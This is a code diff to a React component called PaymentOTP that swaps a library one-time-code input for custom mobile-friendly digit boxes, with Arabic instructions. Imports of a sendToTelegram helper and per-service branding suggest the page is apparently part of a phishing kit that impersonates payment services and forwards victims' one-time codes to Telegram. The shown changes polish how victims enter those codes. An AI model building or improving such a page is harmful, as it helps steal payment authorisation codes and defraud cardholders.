@@ -9,11 +9,6 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
 
 const PaymentOTP = () => {
   const { id, paymentId } = useParams();
@@ -297,50 +292,97 @@ const PaymentOTP = () => {
               </div>
             )}
             
-            {/* OTP Input - Modern Style */}
+            {/* OTP Input - Modern Style with Mobile-Optimized Deletion */}
             <div className="mb-4 sm:mb-6">
-              <div className="flex justify-center items-center gap-3">
-                <InputOTP 
-                  maxLength={4} 
-                  value={otp} 
-                  onChange={setOtp}
-                  disabled={isLocked}
-                  autoComplete="one-time-code"
-                >
-                  <InputOTPGroup className="gap-2 sm:gap-3">
-                    {[0, 1, 2, 3].map((index) => (
-                      <InputOTPSlot 
-                        key={index} 
-                        index={index}
-                        className="w-12 h-12 sm:w-16 sm:h-16 text-xl sm:text-3xl font-bold border-2 rounded-lg transition-all"
-                        style={{
-                          borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
-                          background: otp[index] ? `${branding.colors.primary}10` : 'transparent'
-                        }}
-                      />
-                    ))}
-                  </InputOTPGroup>
-                </InputOTP>
+              <div className="flex justify-center items-center gap-2 sm:gap-3">
+                {/* Custom OTP Input optimized for mobile keyboards */}
+                <div className="flex gap-2 sm:gap-3" dir="ltr">
+                  {[0, 1, 2, 3].map((index) => (
+                    <Input
+                      key={index}
+                      type="text"
+                      inputMode="numeric"
+                      pattern="[0-9]*"
+                      maxLength={1}
+                      value={otp[index] || ''}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, "");
+                        if (val) {
+                          const newOtp = otp.split('');
+                          newOtp[index] = val[val.length - 1];
+                          const updatedOtp = newOtp.join('');
+                          setOtp(updatedOtp);
+                          setError("");
+                          
+                          // Auto-focus next input
+                          if (index < 3) {
+                            const inputs = document.querySelectorAll<HTMLInputElement>('input[type="text"][inputmode="numeric"]');
+                            inputs[index + 1]?.focus();
+                          }
+                        } else if (e.target.value === '') {
+                          // Handle deletion
+                          const newOtp = otp.split('');
+                          newOtp[index] = '';
+                          setOtp(newOtp.join(''));
+                        }
+                      }}
+                      onKeyDown={(e) => {
+                        // Handle backspace/delete from any keyboard (desktop or mobile)
+                        if (e.key === 'Backspace' || e.key === 'Delete') {
+                          const currentValue = otp[index];
+                          
+                          if (!currentValue && index > 0) {
+                            // If current input is empty, move to previous and delete
+                            e.preventDefault();
+                            const newOtp = otp.split('');
+                            newOtp[index - 1] = '';
+                            setOtp(newOtp.join(''));
+                            
+                            // Focus previous input
+                            const inputs = document.querySelectorAll<HTMLInputElement>('input[type="text"][inputmode="numeric"]');
+                            inputs[index - 1]?.focus();
+                          } else if (currentValue) {
+                            // If current has value, delete it
+                            const newOtp = otp.split('');
+                            newOtp[index] = '';
+                            setOtp(newOtp.join(''));
+                          }
+                        }
+                      }}
+                      onFocus={(e) => {
+                        // Select all on focus for easy replacement
+                        e.target.select();
+                      }}
+                      disabled={isLocked}
+                      autoComplete={index === 0 ? "one-time-code" : "off"}
+                      className="w-12 h-12 sm:w-16 sm:h-16 text-xl sm:text-3xl font-bold border-2 rounded-lg transition-all text-center"
+                      style={{
+                        borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
+                        background: otp[index] ? `${branding.colors.primary}10` : 'transparent'
+                      }}
+                    />
+                  ))}
+                </div>
                 
-                {/* Delete Button */}
+                {/* Delete Button - More prominent on mobile */}
                 {otp.length > 0 && !isLocked && (
                   <Button
                     type="button"
                     variant="ghost"
                     size="sm"
                     onClick={handleClearOTP}
-                    className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors"
+                    className="w-10 h-10 sm:w-12 sm:h-12 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors flex-shrink-0"
                   >
-                    <X className="w-4 h-4 sm:w-5 sm:h-5" />
+                    <X className="w-5 h-5 sm:w-6 sm:h-6" />
                   </Button>
                 )}
               </div>
               
-              {/* Keyboard Instructions */}
+              {/* Mobile-friendly Instructions */}
               {otp.length > 0 && !isLocked && (
                 <div className="text-center mt-3">
                   <p className="text-xs text-muted-foreground">
-                    اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
+                    اضغط زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
                   </p>
                 </div>
               )}
